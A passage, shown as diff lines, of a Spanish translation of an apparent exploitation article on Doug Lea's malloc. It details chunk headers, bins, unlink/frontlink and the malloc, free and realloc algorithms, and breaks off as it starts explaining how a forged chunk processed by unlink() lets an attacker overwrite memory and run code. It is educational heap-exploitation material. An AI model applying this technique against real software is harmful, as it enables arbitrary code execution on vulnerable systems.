+             | "chunk" y "nextchunk") y 2 bits de informacion de estado|
+             +---------------------------------------------------------+
+             | fd: puntero forward al siguiente trozo en la lista      |
+             | circular doblemente linkeada (no al siguiente trozo     |
+             | _fisico_)                                               |
+             +---------------------------------------------------------+
+             | bk: puntero de regreso al trozo previo en la lista      |
+             | circular doblemente linkeada (no al trozo _fisico_      |
+             | previo)                                                 |
+             +---------------------------------------------------------+
+             |                                                         .
+             .                                                         .
+             . espacio sin usar (puede ser 0 bytes de largo)           .
+             .                                                         .
+             .                                                         |
+nextchunk -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+             | prev_size: tama~o del "chunk", en bytes (usado por      |
+             | dlmalloc porque este trozo previo esta libre)           |
+             +---------------------------------------------------------+
+
+------[ 3.3.2 - Tama~o de un trozo ]------------------------------------
+
+Cuando un usuario solicita req bytes de memoria dinamica (via malloc(3) o
+realloc(3) por ejemplo), dlmalloc primero llama a request2size() para
+convertir req a tama~o nb utilizable (el tama~o efectivo del trozo de
+memoria asignado, incluyendo sobrepaso). La macro request2size() puede
+solo a~adir 8 bytes (el tama~o del prev_size y campos de tama~o guardados
+en frente del trozo asignado) para req y por lo tanto se ve asi:
+
+#define request2size( req, nb ) \
+    ( nb = (req) + SIZE_SZ + SIZE_SZ )
+
+Pero esta primera version de request2size() no es optima porque no toma
+en cuenta que el campo prev_size del siguiente contiguo trozo puede
+mantener datos de usuario. La macro request2size() deberia por lo tanto
+restar 4 bytes (el tama~o de este campo trepador prev_size) desde el
+resultado previo:
+
+#define request2size( req, nb ) \
+    ( nb = ((req) + SIZE_SZ + SIZE_SZ) - SIZE_SZ )
+
+Esta macro es por supuesto equivalente a:
+
+#define request2size( req, nb ) \
+    ( nb = (req) + SIZE_SZ )
+
+Desafortunadamente esta macro request2size() no es correcta, porque como
+fue mencionado en 3.2.2, el tama~o de un trozo deberia ser siempre
+multiplo de 8 bytes. request2size() deberia por lo tanto devolver el primer
+multiplo de 8 bytes mayor que o igual a ((req) + SIZE_SZ):
+
+#define MALLOC_ALIGNMENT ( SIZE_SZ + SIZE_SZ )
+#define MALLOC_ALIGN_MASK ( MALLOC_ALIGNMENT - 1 )
+
+#define request2size( req, nb ) \
+    ( nb = (((req) + SIZE_SZ) + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK )
+
+La funcion request2size() implementada en el exploit Sudo es alike de la
+misma forma pero devuelve MINSIZE si el tama~o efectivo teorico del trozo
+es menos que MINSIZE bytes (el tama~o minimo asignable):
+
+#define MINSIZE sizeof(struct malloc_chunk)
+
+size_t request2size( size_t req )
+{
+    size_t nb;
+
+    nb = req + ( SIZE_SZ + MALLOC_ALIGN_MASK );
+    if ( nb < (MINSIZE + MALLOC_ALIGN_MASK) ) {
+        nb = MINSIZE;
+    } else {
+        nb &= ~MALLOC_ALIGN_MASK;
+    }
+    return( nb );
+}
+
+Finalmente, la macro request2size() implementada en el Malloc de Doug Lea
+funciona de este modo pero agrega una entera deteccion de overflows:
+
+#define request2size(req, nb) \
+ ((nb = (req) + (SIZE_SZ + MALLOC_ALIGN_MASK)),\
+  ((long)nb <= 0 || nb < (INTERNAL_SIZE_T) (req) \
+   ? (__set_errno (ENOMEM), 1) \
+   : ((nb < (MINSIZE + MALLOC_ALIGN_MASK) \
+           ? (nb = MINSIZE) : (nb &= ~MALLOC_ALIGN_MASK)), 0)))
+
+------[ 3.3.3 - campo prev_size ]---------------------------------------
+
+Si el trozo de memoria ubicado inmediatamente antes de un trozo p es
+asignado (como dlmalloc determina si el trozo previo esta asignado o no
+esta detallado en 3.3.4), los 4 bytes correspondientes al campo prev_size
+del trozo p no son usados por dlmalloc y pueden por lo tanto mantener
+datos de usuario (para decrementar perdidas).
+
+Pero si el trozo de memoria ubicado inmediatamente antes del trozo p
+esta libre, el campo prev_size del trozo p es usado por dlmalloc y
+mantiene el tama~o de ese trozo previo libre. Dado un puntero al trozo p,
+la direccion del trozo previo puede por consiguiente ser computada, gracias
+a la macro prev_chunk():
+
+#define prev_chunk( p ) \
+    ( (mchunkptr)(((char *)(p)) - ((p)->prev_size)) )
+
+------[ 3.3.4 - campo de tama~o ]----------------------------------------
+
+El campo de tama~o de un tag limite mantiene el tama~o efectivo (en bytes)
+del trozo de memoria asociado e informacion de estado adicional. Esta
+informacion de estado es guardada con los 2 bytes menos significantes,
+que de otra manera estarian sin uso (porque como fue detallado en 3.3.2,
+el tama~o de un trozo es siempre multiplo de 8 bytes, y los 3 bits menos
+significantes de un campo de tama~o podrian por lo tanto siempre ser
+iguales a 0).
+
+El bit de menor orden del campo de tama~o mantiene el bit PREV_INUSE
+y el segundo bit mas bajo de orden mantiene el bit IS_MMAPED:
+
+#define PREV_INUSE 0x1
+#define IS_MMAPPED 0x2
+
+Para extraer el tama~o efectivo de un trozo p de su campo de tama~o,
+dlmalloc por lo tanto necesita enmascarar estos dos bits de estado,
+y usa la macro chunksize() para este proposito:
+
+#define SIZE_BITS ( PREV_INUSE | IS_MMAPPED )
+
+#define chunksize( p ) \
+    ( (p)->size & ~(SIZE_BITS) )
+
+- Si el bit IS_MMAPPED esta configurado, el trozo asociado fue asignado via
+el mecanismo de mapeo de memoria descripto en 3.1.2.5. Para determinar si
+un trozo de memoria p fue asignado via este mecanismo o no, Malloc de
+Doug Lea llama a chunk_is_mapped():
+
+#define chunk_is_mmapped( p ) \
+    ( (p)->size & IS_MMAPPED )
+
+- Si el bit PREV_INUSE de un trozo p esta configurado, el trozo fisico de
+memoria ubicado inmediatamente antes mantiene datos de usuario. Pero si
+el bit PREV_INUSE esta limpio, el trozo fisico de memoria antes de p esta
+libre, y el campo prev_size del trozo p es por lo tanto usado por dlmalloc y
+contiene el tama~o de ese trozo fisico previo.
+
+Malloc de Doug Lea usa la macro prev_inuse() para determinar si el trozo
+fisico ubicado inmediatamente antes de un trozo de memoria p esta asignado
+o no:
+
+#define prev_inuse( p ) \
+    ( (p)->size & PREV_INUSE )
+
+Pero para determinar si el trozo p en si mismo esta en uso o no,
+dlmalloc tiene que extraer el bit PREV_INUSE del siguiente trozo de memoria
+contiguo:
+
+#define inuse( p ) \
+    (((mchunkptr)((char*)(p)+((p)->size&~PREV_INUSE)))->size&PREV_INUSE)
+
+----[ 3.4 - Bins ]------------------------------------------------------
+
+"Los trozos disponibles son mantenidos en bins, agrupados por tama~o",
+como se menciono en 3.1.2.2 y 3.2.3. Las dos excepciones son el recordatorio
+de que el mas reciente trozo de memoria divisor (no en el tope) y el
+trozo mas en el tope disponible (el trozo salvaje) que esta tratado
+especialmente y nunca incluido en ningun bin.
+
+------[ 3.4.1 - Indexando en bins ]-------------------------------------
+
+Hay muchos de estos bins (128), y dependiendo de su tama~o (su tama~o
+efectivo, no el tama~o solicitado por el usuario) un trozo de memoria
+libre es guardado por dlmalloc en el bin correspondiente al rango correcto
+de tama~o. Para encontrar el index de este bin (los 128 bins son en efecto
+guardados en un array de bins), dlmalloc llama a las macros smallbin_index()
+y bin_index().
+
+#define smallbin_index( sz ) \
+    ( ((unsigned long)(sz)) >> 3 )
+
+Malloc de Doug Lea considera los trozos cuyo tama~o es menor que 512 bytes
+como trozos peque~os, y guarda estos trozos en una de los 62 tan nombrados
+bins peque~os. Cada bin peque~o contiene trozos de identico tama~o, y
+debido a que el tama~o minimo asignado es 16 bytes y el tama~o de un
+trozo es siempre un multiplo de 8 bytes, el primer bin peque~o contiene
+los trozos de 16 bytes, el segundo los trozos de 24 bytes, el tercero
+los trozos de 32 bytes, y demas, y el ultimo contiene los trozos de 504 bytes.
+El index del bin correspondiente al tama~o sz de un trozo peque~o es
+por lo tanto ( sz / 8), como es implementado en la macro smallbin_index().
+
+#define bin_index(sz)                                                     \
+((((unsigned long)(sz) >> 9) ==    0) ?       ((unsigned long)(sz) >>  3):\
+ (((unsigned long)(sz) >> 9) <=    4) ?  56 + ((unsigned long)(sz) >>  6):\
+ (((unsigned long)(sz) >> 9) <=   20) ?  91 + ((unsigned long)(sz) >>  9):\
+ (((unsigned long)(sz) >> 9) <=   84) ? 110 + ((unsigned long)(sz) >> 12):\
+ (((unsigned long)(sz) >> 9) <=  340) ? 119 + ((unsigned long)(sz) >> 15):\
+ (((unsigned long)(sz) >> 9) <= 1364) ? 124 + ((unsigned long)(sz) >> 18):\
+                                        126)
+
+El index del bin correspondiente a un trozo de memoria cuyo tama~o es
+mayor que o igual a 512 bytes es obtenido via la macro bin_index().
+Gracias al bin_index(), el rango de tama~o correspondiente a cada bin
+puede ser determinado:
+
+- Un trozo libre cuyo tama~o es igual a 1504 bytes por ejemplo es guardado
+en el numero bin 79 (56 + (1504 >> 6)) ya que (1504 >> 9) es igual a 2
+y por lo tanto mayor que 0 pero menos que o igual a 4. Ademas, el numero
+bin 79 contiene los trozos cuyo tama~o es mayor que o igual a
+1472 ((1504 >> 6) * 2^6) bytes pero menos que 1536 (1472 + 2^6).
+
+- Un trozo libre cuyo tama~o es igual a 16392 bytes es guardado en el
+numero bin 114 (110 + (16392 >> 12)) ya que (16392 >> 9) es igual a 32
+y por lo tanto mayor que 20 pero menos que o igual a 84. Ademas, el numero
+bin 114 contiene los trozos cuyo tama~o es mayor que o igual a
+16384 ((16392 >> 12) * 2^12) bytes pero menos que 20480 (16384 + 2^12).
+
+- Y demas.
+
+------[ 3.4.2 - Linkin Park^H^H^H^H^Hg trozos en listas bin ]---------
+
+Los trozos de memoria libres son guardados en listas circulares
+doblemente linkeadas. Hay una lista circular doblemente linkeada por bin,
+y estas listas estan inicialmente vacias porque al principio el heap
+completo esta compuesto de un solo trozo (nunca incluido en ningun bin),
+el trozo salvaje. Un bin no es nada mas que un par de punteros (un puntero
+forward y un puntero de regreso) sirviendo como la cabeza de la lista
+asociada doblemente linkeada.
+
+"Los trozos en cada bin estan mantenidos en decrementar orden por tama~o.
+Esto es irrelevante para los bins peque~os, todos conteniendo los trozos
+de igual tama~o, pero facilitan la asignacion de mejor-calce para trozos
+mas largos."
+
+El puntero forward de un bin por lo tanto apunta al primer (el mas largo)
+trozo de memoria en la lista (o para el bin en si mismo si la lista esta
+vacia), el puntero forward de este primer trozo apunta al segundo trozo
+en la lista, y demas hasta el puntero forward de un trozo (el ultimo trozo
+en la lista) apunta al bin de nuevo. El puntero de regreso de un bin
+en su lugar apunta al ultimo trozo de memoria (el mas peque~o) en la lista
+(o al bin en si mismo si la lisa esta vacia), el puntero de regreso de este
+trozo apunta al trozo previo en la lista, y demas hasta que el puntero de
+regreso de un trozo (el primer trozo en la lista) apunta al bin de nuevo.
+
+- Para sacar un trozo libre p de su lista doblemente linkeada, dlmalloc tiene
+que reemplazar el puntero de regreso del trozo siguiente p en la lista
+con un puntero al trozo precediendo p en la lista, y el puntero forward del
+trozo precediendo p en la lista con un puntero al trozo siguiendo p en la
+lista. Malloc de Doug Lea llama a la macro unlink() para este proposito:
+
+#define unlink( P, BK, FD ) {            \
+    BK = P->bk;                          \
+    FD = P->fd;                          \
+    FD->bk = BK;                         \
+    BK->fd = FD;                         \
+}
+
+- Para ubicar un trozo libre P de tama~o S en su bin (en la lista doblemente
+linkeada asociada realmente), en orden de tama~o, dlmalloc llama a
+frontlink(). "Trozos del mismo tama~o son alineados con el mas recientemente
+liberado al frente, y las asignaciones son tomadas desde atras. Esto resulta
+en asignacion en orden LRU o FIFO", como es mencionado en 3.1.2.2.
+
+La macro frontlink() llama a smallbin_index() o bin_index() (presentada en
+3.4.1) para encontrar el index IDX del bin correspondiente al tama~o S,
+llama a mark_binblock() para indicar que este bin no esta mas vacio, llama a
+bin_at() para determinar la direccion fisica del bin, y finalmente guarda
+el trozo libre P en el lugar correcto en la lista doblemente linkeada del
+bin:
+
+#define frontlink( A, P, S, IDX, BK, FD ) {            \
+    if ( S < MAX_SMALLBIN_SIZE ) {                     \
+        IDX = smallbin_index( S );                     \
+        mark_binblock( A, IDX );                       \
+        BK = bin_at( A, IDX );                         \
+        FD = BK->fd;                                   \
+        P->bk = BK;                                    \
+        P->fd = FD;                                    \
+        FD->bk = BK->fd = P;                           \
+    } else {                                           \
+        IDX = bin_index( S );                          \
+        BK = bin_at( A, IDX );                         \
+        FD = BK->fd;                                   \
+        if ( FD == BK ) {                              \
+            mark_binblock(A, IDX);                     \
+        } else {                                       \
+            while ( FD != BK && S < chunksize(FD) ) {  \
+                FD = FD->fd;                           \
+            }                                          \
+            BK = FD->bk;                               \
+        }                                              \
+        P->bk = BK;                                    \
+        P->fd = FD;                                    \
+        FD->bk = BK->fd = P;                           \
+    }                                                  \
+}
+
+----[ 3.5 - Principales rutinas publicas ]------------------------------
+
+El proposito final de un atacante que quiso romper el heap de un proceso
+es ejecutar codigo arbitrario. Malloc de Doug Lea puede ser trucada
+para alcanzar esta meta despues de una corrupcion de heap exitosamente,
+gracias a la macro unlink(), o gracias a la macro frontlink(), ambos
+presentados arriba y detallados en 3.6. La siguiente descripcion de
+algoritmos malloc(3), free(3) y realloc(3) por lo tanto se focaliza
+en estas dos macros internas.
+
+------[ 3.5.1 - El algoritmo malloc(3) ]--------------------------------
+
+La funcion malloc(3), nombrada __libc_malloc() en la Libreria GNU C
+(malloc() es solo un simbolo debil) y mALLOc() en el archivo malloc.c,
+ejecuta en el primer lugar el codigo apuntando a para __malloc_hook si
+este pirateo de debugging no es igual a NULL (pero normalmente es).
+El siguiente malloc(3) convierte la cantidad de memoria dinamica
+solicitada por el usuario en una forma utilizable (via request2size()
+presentada en 3.3.2), y llama a la funcion interna chunk_alloc() que
+toma el primer paso exitoso de los siguientes:
+
+[1] - "El bin correspondiente al tama~o solicitado es escaneado, y si
+un trozo de exactamente el mismo tama~o es encontrado, es tomado."
+
+Malloc de Doug Lea considera un trozo como para ser "de exactamente el
+tama~o correcto" si la diferencia entre su tama~o y el tama~o de solicitud
+es mayor que o igual a 0 pero menor que MINSIZE bytes. Si esta diferencia
+fue menor que 0 el trozo podria no ser lo suficientemente grande, y si la
+diferencia fue mayor que o igual a MINSIZE bytes (el tama~o minimo asignado)
+dlmalloc puede formar un nuevo trozo con este sobrepaso y deberia por lo
+tanto llevar a cabo una operacion de division (no soportada por este primer
+paso).
+
+[1.1] -- El caso de una solicitud de tama~o peque~a (una solicitud de
+tama~o es peque~a si el bin correspondiente y el siguiente bin son peque~os
+(bins peque~os son descriptos en 3.4.1) es tratado de forma separada:
+
+[1.1.1] --- Si la lista doblemente linkeada del bin correspondiente no
+esta vacia, chunk_alloc() elecciona el ultimo trozo en esta lista
+(no a traves de la lista y ningun chequeo de tama~o son necesitados para
+bins peque~os ya que contienen trozos de identico tama~o).
+
+[1.1.2] --- Pero si esta lista esta vacia, y si la lista doblemente
+linkeada del siguiente bin no esta vacia, chunk_alloc() selecciona el
+ultima trozo en esta lista (la diferencia entre el tama~o de este trozo
+y la solicitud de tama~o es en efecto menor que MINSIZE bytes (es igual a
+8 bytes, como fue detallado en 3.4.1)).
+
+[1.1.3] --- Finalmente, si un trozo libre de exactamente el tama~o correcto
+fue encontrado y seleccionado, chunk_alloc() llama a unlink() para sacar de
+este trozo su lista doblemente linkeada, y lo devuelve a mALLOc(). Si ningun
+trozo fue encontrado, el paso[2] es descartado.
+
+[1.2] -- Si la solicitud de tama~o no es peque~a, la lista doblemente
+linkeada del bin correspondiente es escaneada. chunk_alloc() empieza desde
+el ultimo trozo libre (el mas peque~o) en la lista y sigue el puntero de
+regreso de cada trozo atravesado:
+
+[1.2.1] --- Si durante el scan un trozo muy grande es encontrado (un trozo
+cuyo tama~o es MINSIZE bytes o mas grande que la solicitud de tama~o),
+el scan es abortado ya que los trozos siguientes atravesados podrian ser
+demasiado grandes tambien (los trozos son efectivamente ordenados por
+tama~o con una lista doblemente linkeada) y el paso[2] es descartado.
+
+[1.2.2] --- Pero si un trozo de exactamente el tama~o correcto es encontrado,
+unlink() es llamada para sacarlo de su lista doblemente linkeada, y el trozo
+es luego devuelto a mALLOc(). Si no fue encontrado un trozo suficientemente
+grande durante todo el scan, el paso[2] es descartado.
+
+[2] - "El trozo mas recientemente recordado es usado si es lo suficientemente
+grande."
+
+Pero este trozo de memoria libre particular no existe siempre: dlmalloc le
+da este significado especial (la etiqueta `last_remainder' ) para un trozo
+libre con la macro link_last_remainder(), y quita este significado especial
+con el macro clear_last_remainder(). Entonces si uno de los trozos libres
+disponibles es marcado con la etiquera `last_remainder':
+
+[2.1] -- Es dividido en dos partes si es demasiado grande (si la diferencia
+entre su tama~o y la solicitud de tama~o es mayor que o igual a MINSIZE bytes)
+La primera parte (cuyo tama~o es igual a la solicitud de tama~o) es devuelto
+a mALLOc() y la segunda parte se convierte en un nuevo `last_remainder'
+(via link_last_remainder()).
+
+[2.2] -- Pero si la diferencia entre el tama~o del trozo `last_remainder'
+y la solicitud de tama~o es menor que MINSIZE bytes, chunk_alloc() llama a
+clear_last_remainder() y siguiente:
+
+[2.2.1] --- Devuelve ese trozo mas recientemente recordado (que pierde
+su etiqueta `last_remainder' por la llamada clear_last_remainder()) para
+mALLOc() si es suficientemente grande (si la diferencia entre su tama~o
+y la solicitud de tama~o es mayor que o igual a 0).
+
+[2.2.2] --- O ubicar este trozo en su lista doblemente linkeada (gracias
+a la macro frontlink()) si es suficientemente peque~o (si la diferencia
+entre su tama~o y la solicitud de tama~o es menor que 0), y descarta
+el paso[3].
+
+[3] - "Otros bins son escaneados en incrementar el orden de tama~o, usando
+un trozo suficientemente grande para llenar completamente la solicitud,
+y dividir cualquier recordador."
+
+Los bins escaneados (el scan de un bin consiste en atravesar la lista
+doblemente linkeada asociada, empezando desde el ultimo (el mas peque~o)
+trozo libre en la lista, y siguiendo el puntero de regreso de cada
+trozo atravesado) todos corresponden a tama~os mayores que o iguales a la
+solicitud de tama~o y son procesados uno por uno (empezando desde el bin
+donde termino la busqueda en el paso[1]) hasta que un trozo suficientemente
+grande es encontrado:
+
+[3.1] -- Este trozo suficientemente grande esta dividido en dos partes
+si es demasiado grande (si la diferencia entre su tama~o y la solicitud
+de tama~o es mayor que o igual a MINSIZE bytes). La primer parte (cuyo
+tama~o es igual a la solicitud de tama~o) es tomado de su lista doblemente
+linkeada via unlink() y devuelto a mALLOc(). La segunda parte se convierte
+en un nuevo `last_remainder' via link_last_remainder().
+
+[3.2] -- Pero si un trozo de exactamente el tama~o correcto fue encontrado,
+unlink() es llamado para tomar su lista doblemente linkeada, y el trozo
+es despues devuelto a mALLOc(). Si no fue encontrado un trozo suficientemente
+grande, el paso[4] es descartado.
+
+[4] - "Si es suficientemente largo, el trozo bordeando el final de la memoria
+(`top') es divivido."
+
+El trozo bordeando el final del heap (el trozo salvaje presentado en 3.1.2.4)
+es suficientemente largo si la diferencia entre su tama~o y la solicitud
+de tama~o es mayor que o igual a MINSIZE bytes (el paso[5] es de otro modo
+descartado). El trozo salvaje es entonces dividido en dos partes: la
+primer parte (cuyo tama~o es igual a la solicitud de tama~o) es devuelta
+a mALLOc(), y la segunda parte se convierte en el nuevo trozo salvaje.
+
+[5] - "Si la solicitud de tama~o se encuentra con mmap threshold y el
+sistema soporta mmap, y hay un par de regiones suficientes actualmente
+mmapeadas y asignadas, y una llamada a mmap sucede, la solicitud es
+asignada via mapeo directo de memoria."
+
+Malloc de Doug Lea llama a la funcion interna mmap_chunk() si las condiciones
+anteriores se cumplen (de otro modo el paso[6] es descartado), pero ya que
+el valor por defecto del threshold de mmap es mas bien largo (128k), y ya que
+la variable de entorno MALLOC_MMAP_THRESHOLD_ no puede pasar por encima a
+este valor por defecto cuando un programa SUID o SGID es ejecutado,
+mmap_chunk() no esta detallado en el presente texto.
+
+[6] - "De otro modo, el tope de la memoria es extendido obteniendo mas
+espacio desde el sistema (normalmente usando sbrk, pero definible a
+cualquier cosa via la macro MORECORE)."
+
+Despues de una extension exitosa, el trozo salvaje es dividido como podria
+haber sido hecho en el paso[4], pero si la extension falla, un puntero NULL
+es devuelto a mALLOc().
+
+------[ 3.5.2 - El algoritmo free(3) ]----------------------------------
+
+La funcion free(3), nombrada __libc_free() en la Libreria GNU C (free()
+es solo un simbolo debil) y fREe() en el archivo malloc.c, ejecuta en
+primer lugar el codigo apuntado a por __free_hook si este pirateo de
+debuggeo no es igual a NULL (pero normalmente lo es), y luego distingue
+entre los siguientes casos:
+
+[1] - "free(0) no tiene efecto."
+
+Pero si el argumento puntero pasado a free(3) no es igual a NULL (y
+generalmente no lo es), el paso[2] es descartado.
+
+[2] - "Si el trozo fue asignado via mmap, es desarrollado via munmap()."
+
+La funcion fREe() determina (gracias a la macro chunk_is_mapped() presentada
+en 3.3.4) si el trozo a ser liberado fue asignado via el mecanismo de mapeo
+de memoria (descripto en 3.1.2.5) o no, y llama a la funcion interna
+munmap_chunk() (no detallada en el presente texto) si lo fue, pero llama
+a chunk_free() (paso[3] y paso[4]) si no lo fue.
+
+[3] - "Si un trozo devuelto bordea el final alto actual de memoria, es
+consolidado en el tope".
+
+Si el trozo a ser liberado es ubicado inmediatamente antes del trozo mas
+alto disponible (el trozo salvaje), un nuevo trozo salvaje es ensamblado
+(pero de otro modo el paso[4] es descartado):
+
+[3.1] -- Si el trozo ubicado inmediatamente antes del trozo a ser liberado
+esta sin usar, es sacado de su lista doblemente linkeada via unlink()
+y se convierte en el principio del nuevo trozo salvaje (compuesto del
+trozo salvaje formador, el trozo a ser liberado, y el trozo ubicado
+inmediatamente antes). Como una nota paralela, unlink() es equivalente
+a clear_last_remainder() si el trozo procesado es el `last_remainder'.
+
+[3.2] -- Pero si ese trozo previo es asignado, el trozo a ser liberado
+se convierte en el principio del nuevo trozo salvaje (compuesto del
+trozo salvaje formador y el trozo a ser liberado).
+
+[4] - "Otros trozos son consolidados como van llegando, y ubicados en
+los bins correspondientes. (Esto incluye el caso de consolidacion con
+el actual `last_remainder')."
+
+[4.1] -- Si el trozo ubicado inmediatamente antes del trozo a ser
+liberado esta sin usar, es sacado de su lista doblemente linkeada via
+unlink() (si no es el `last_remainder') y consolidado con el trozo a
+ser liberado.
+
+[4.2] -- Si el trozo ubicado inmediatamente despues del trozo a ser
+liberado esta sin usar, es sacado de su lista doblemente linkeada
+via unlink() (si no es el `last_remainder') y consolidado con el trozo
+a ser liberado.
+
+[4.3] -- El trozo unido resultante es ubicado en su lista doblemente
+linkeada (via la macro frontlink()), o se convierte en el nuevo
+`last_remainder' si el antiguo `last_remainder' fue consolidado con
+el trozo a ser liberado (pero la macro link_last_remainder() es llamada
+solo si el principio del nuevo `last_remainder' es diferente del principio
+del antiguo `last_remainder').
+
+------[ 3.5.3 - El algoritmo realloc(3) ]-------------------------------
+
+La funcion realloc(3), llamada __libc_realloc() en la Libreria GNU C
+(realloc() es solo un simbolo debil) y rEALLOc() en el archivo malloc.c,
+ejecuta en primer lugar el codigo apuntado a por _realloc_hook si
+este trozo debugger no es igual a NULL (pero normalmente lo es), y luego
+distingue entre los siguientes casos:
+
+[1] - "A no ser que #define REALLOC_ZERO_BYTES_FREES sea configurado,
+realloc con un argumento de tama~o de cero (re)asigna un trozo de tama~o
+minimo."
+
+Pero si REALLOC_ZERO_BYTES_FREES es configurado, y si realloc(3) fue llamado
+con un argumento de tama~o cero, la funcion fREe() (descripta en 3.5.2)
+es llamada para liberar el trozo de memoria pasado a realloc(3). El paso[2]
+de otro modo es descartado.
+
+[2] - "realloc de null se supone que debe ser el mismo que malloc".
+
+Si realloc(3) fue llamado con un argumento puntero de NULL, la funcion
+mALLOc() (detallada en 3.5.1) es llamada para asignar un nuevo trozo de
+memoria. El paso[3] de otro modo es descartado, pero la cantidad de memoria
+dinamica solicitada por el usuario es primero convertida en una forma
+utilizable (via request2size() presentada en 3.3.2).
+
+[3] - "Los trozos que fueron obtenidos via mmap [...]."
+
+rEALLOc() llama a la macro chunk_is_mapped() (presentada en 3.3.4) para
+determinar si el trozo a ser reasignado fue obtenido via el mecanismo
+de mapeo de memoria (descripto en 3.1.2.5) o no. Si lo fue, un codigo
+especifico (no detallado en el presente texto) es ejecutado, pero si
+no lo fue, el trozo a ser reasignado es procesado por la funcion interna
+chunk_realloc() (paso[4] y siguientes).
+
+[4] - "Si la reasignacion es para menos espacio [...]."
+
+[4.1] -- El trozo procesado es dividido en dos partes si su tama~o es
+MINSIZE bytes o mayor que la solicitud de tama~o: la primera parte
+(cuyo tama~o es igual a la solicitud de tama~o) es devuelta a rEALLOc(),
+y la segunda parte es liberada via una llamada a chunk_free() (detallada
+en 3.5.2).
+
+[4.2] -- Pero el trozo procesado es simplemente devuelto a rEALLOc() si la
+diferencia entre su tama~o y la solicitud de tama~o es menos que MINSIZE
+bytes (esta diferencia es por supuesto mayor que o igual a 0 ya que
+el tama~o del trozo procesado es mayor que o igual a la solicitud de
+tama~o).
+
+[5] - "De otro modo, si la reasignacion es para espacio adicional, y el
+trozo puede ser extendido, lo es, es tomada una secuencia malloc-copy-free.
+Hay varios diferentes caminos en que un trozo puede ser extendido.
+Todos son tratados:"
+
+[5.1] -- "Extendiendo hacia adelante en el siguiente trozo libre adyacente."
+
+Si el trozo de memoria ubicado inmediatamente despues del trozo a ser
+reasignado esta libre, los dos pasos siguientes son tratados antes de que el
+paso[5.2] sea descartado:
+
+[5.1.1] --- Si el trozo libre es el trozo mas alto disponible (el trozo
+salvaje) y si su tama~o mas el tama~o del trozo a ser reasignado es MINSIZE
+bytes o mayor que la solicitud de tama~o, el trozo salvaje es dividido en
+dos partes. La primera parte es consolidada con el trozo a ser reasignado
+y el trozo unido resultante es devuelto a rEALLOc() (el tama~o de este
+trozo unido es por supuesto igual a la solicitud de tama~o), y la segunda
+parte se convierte en el nuevo trozo salvaje.
+
+[5.1.2] --- Pero si ese trozo libre es un trozo libre normal, y si su
+tama~o mas el tama~o del trozo a ser reasignado es mayor que o igual a la
+solicitud de tama~o, es sacado de su lista doblemente linkeada via unlink()
+(equivalente a clear_last_remainder() si el trozo procesado es el
+`last_remainder') y consolidado con el trozo a ser liberado, y el trozo
+unido resultante es luego tratado como podria haberse hecho en el paso[4].
+
+[5.2] -- "Cambiando hacia atras y extendiendo hacia adelante."
+
+Si el trozo ubicado inmediatamente antes del trozo a ser asignado esta libre,
+y si el trozo ubicado inmediatamente despues esta libre tambien, los dos
+pasos siguientes son tratados antes de que el paso[5.3] sea descartado:
+
+[5.2.1] --- Si el trozo ubicado inmediatamente despues del trozo a ser
+reasignado es el trozo mas alto disponible (el trozo salvaje) y si su
+tama~o mas el tama~o del trozo a ser rasignado mas el tama~o del trozo
+previo es MINSIZE bytes o mayor que la solicitud de tama~o, los tres
+trozos mencionados son unidos. El trozo previo es primero sacado de su
+lista doblemente linkeada via unlink() (equivalente a clear_last_remainder()
+si el trozo procesado es el `last_remainder'), el contenido del trozo a ser
+reasignado es entonces copiado al trozo nuevamente unido, y este trozo
+unido es finalmente dividido en dos partes: la primera parte es devuelta
+a rEALLOc() (el tama~o de este trozo es por supuesto igual), ya la segunda
+parte se convierte en el nuevo trozo salvaje.
+
+[5.2.2] --- Si el trozo ubicado inmediatamente despues del trozo a ser
+reasignado es un trozo libre normal, y si su tama~o mas el tama~o del
+trozo a ser reasignado mas el tama~o del trozo previo es mayor que o igual
+a la solicitud de tama~o, los tres trozos mencionados son unidos. Los trozos
+previos y siguientes primero son sacados de sus listas doblemente linkeadas
+via unlink() (equivalente a clear_last_remainder() si el trozo procesado
+es el `last_remainder'), el contenido del trozo a ser reasignado es despues
+copiado al trozo nuevamente unido, y este trozo unido es finalmente tratado
+como podria haber sido hecho en el paso[4].
+
+[5.3] -- "Cambiando hacia atras, uniendo espacio adyacente precedente".
+
+Si el trozo ubicado inmediatamente antes del trozo a ser reasignado esta
+libre y si su tama~o mas el tama~o del trozo a ser reasignado es mayor que
+o igual a la solicitud de tama~o, los dos trozos mencionados son unidos
+(pero el paso[5.4] de otro modo es descartado). El trozo previo es primero
+sacado de su lista doblemente linkeada via unlink() (equivalente a
+clear_last_remainder() si el trozo procesado es el `last_remainder'),
+el contenido del trozo a ser reasginado es entonces copiado al trozo
+nuevamente unido, y este trozo unido es finalmente tratado como podria
+haber sido hecho en el paso[4].
+
+[5.4] -- Si el trozo a ser reasignado no puede ser extendido, la funcion
+interna chunk_alloc() (detallada en 3.5.1) es llamada para asignar un
+nuevo trozo de exactamente la solicitud de tama~o:
+
+[5.4.1] --- Si el trozo devuelto por chunk_alloc() es ubicado inmediatamente
+despues del trozo a ser reasignado (esto puede ocurrir solo cuando ese
+trozo siguiente fue extendido durante la ejecucion chunk_alloc() (ya que
+no fue lo suficientemente grande antes), entonces esto solo puede pasar
+cuando este trozo siguiente es el trozo salvaje, extendido durante el paso[6]
+del algoritmo malloc(3), es consolidado con el trozo a ser reasignado y el
+trozo unido resultante es luego tratado como podria haber sido hecho en el
+paso[4].
+
+[5.4.2] --- El trozo a ser reasignado de otro modo es liberado via
+chunk_free() (detallado en 3.5.2), pero su contenido es primero copiado al
+trozo nuevamente asignado devuelto por chunk_alloc(). Finalmente, el trozo
+devuelto por chunk_alloc() es devuelto a rEALLOc().
+
+----[ 3.6 - Ejecucion de codigo arbitrario ]----------------------------
+
+------[ 3.6.1 - La tecnica unlink() ]-----------------------------------
+
+--------[ 3.6.1.1 - Concepto ]------------------------------------------
+
+Si un atacante quiere trucar dlmalloc para procesar un trozo de memoria
+falso cuidadosamente dise~ado (o un trozo cuyos campos fd y bk hayan
+sido corrompidos) con la macro unlink(), podran sobreescribir cualquier
+entero en memoria con el valor de su eleccion, y por consiguiente
+podran enventualmente ejcutar codigo arbitrario.
+
+#define unlink( P, BK, FD ) {            \
+[1] BK = P->bk;                          \
+[2] FD = P->fd;                          \
+[3] FD->bk = BK;                         \
+[4] BK->fd = FD;                         \
+}
+
+En efecto, el atacante puede guardar la direccion de un puntero de funcion,
